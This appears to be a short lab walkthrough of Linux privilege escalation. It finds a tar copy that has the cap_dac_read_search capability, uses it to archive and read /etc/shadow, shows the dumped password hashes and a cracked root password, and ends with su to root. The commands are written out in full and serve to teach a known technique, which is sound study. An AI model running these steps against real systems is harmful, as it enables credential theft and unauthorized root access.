### **nxnjz@test-machine:~$ getcap -r / 2>/dev/null**
/home/nxnjz/tar = cap_dac_read_search+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
 
### An unusual finding: tar has cap_dac_read_search capabilities. This means it has read access to anything. We could use this to read SSH keys, or /etc/shadow and get password hashes.
### /etc/shadow is usually only readable by root:
### **nxnjz@test-machine:~$ cat /etc/shadow**
cat: /etc/shadow: Permission denied
 
### But since tar has that capability, we can archive /etc/shadow, extract it from the archive and read it.
### **nxnjz@test-machine:~$ ls**
tar
### **nxnjz@test-machine:~$ ./tar -cvf shadow.tar /etc/shadow**
./tar: Removing leading `/’ from member names
/etc/shadow
### **nxnjz@test-machine:~$ ls**
shadow.tar tar
### **nxnjz@test-machine:~$ ./tar -xvf shadow.tar**
etc/shadow
### **nxnjz@test-machine:~$ ls**
etc shadow.tar tar
### **nxnjz@test-machine:~$ cat etc/shadow**
root:$1$xyz$Bf.3hZ4SmETM3A78n1nWr.:17735:0:99999:7:::
daemon:*:17729:0:99999:7:::
bin:*:17729:0:99999:7:::
sys:*:17729:0:99999:7:::
sync:*:17729:0:99999:7:::
games:*:17729:0:99999:7:::
man:*:17729:0:99999:7:::
lp:*:17729:0:99999:7:::
mail:*:17729:0:99999:7:::
news:*:17729:0:99999:7:::
uucp:*:17729:0:99999:7:::
proxy:*:17729:0:99999:7:::
nxnjz:$1$sTfA$SnnNO9Cflvs4aq4ZCU/6J/:17764:0:99999:7:::
 
### After cracking that password hash for root, which turns out to be ‘root1234’, we can login using su:
### **nxnjz@test-machine:~$ su root**
Password:
### **root@test-machine:/home/nxnjz# whoami**
root
